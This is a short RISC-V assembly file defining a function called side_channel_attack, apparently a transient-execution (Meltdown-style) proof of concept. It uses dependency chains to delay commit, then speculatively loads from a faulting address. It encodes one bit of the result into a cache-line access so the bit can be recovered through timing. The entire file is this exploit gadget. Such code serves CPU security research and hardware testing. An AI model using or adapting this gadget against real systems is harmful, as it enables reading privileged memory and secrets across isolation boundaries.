#include <riscv_asm.h>

.global side_channel_attack


#define ptr   a0
#define bit   a1
#define lines a2
#define train a3
side_channel_attack:
  addi sp, sp,-8

  //Slow down the commits using depedencies, also slow down the branch execution to avoid pipeline flush
  mv  t0, sp
  sd  t0, 0(t0)
  ld  t0, 0(t0)
  sd  t0, 0(t0)
  ld  t0, 0(t0)
  sd  t0, 0(t0)
  ld  t0, 0(t0)
  sd  train, 0(t0)
  ld  train, 0(t0)


  //Never commit the attack instructions
  beqz train, skip_speculative

  // This load will page fault
  ld   t2, 0  (ptr)
  srl  t2, t2, bit
  andi t2, t2, 1
  slli t2, t2, 6
  or   t2, t2, lines
  ld   t2, 0  (t2)

skip_speculative:
  addi sp, sp, 8
  ret

